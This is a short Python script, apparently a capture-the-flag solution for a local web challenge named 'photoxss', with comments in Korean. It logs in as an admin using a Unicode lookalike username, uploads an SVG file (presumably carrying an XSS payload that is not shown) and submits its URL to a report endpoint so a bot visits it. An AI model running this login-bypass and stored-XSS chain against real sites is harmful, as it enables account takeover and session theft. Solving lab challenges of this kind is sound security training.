import requests
import re

url = 'http://localhost:10002'
payload = {"id": "PHOTOXß_ADMIN", "pw": "photoxss!@@"}
sess = requests.Session()
sess.post(url+'/login', data=payload)

file_path = './solve.svg'

# 파일 열기
with open(file_path, 'rb') as solve_svg:
    solve_files = {'file': solve_svg}

    # 업로드 요청 보내기
    res = sess.post(url+'/upload', files=solve_files)

    # 파일 업로드 후에는 파일 객체를 닫습니다.
    solve_svg.close()

    # 파일 업로드 응답에서 URL 추출
    pattern = r'href="(/uploads/[^"]+)"'
    matches = re.findall(pattern, res.text)

    if matches:
        upload_url = matches[0]
        print("파일 업로드 성공:", upload_url)

        report_res = sess.post(url+'/report', data={'url': f"http://127.0.0.1:3000{upload_url}"})
        print(report_res.text)
    else:
        print("URL을 찾을 수 없습니다.")
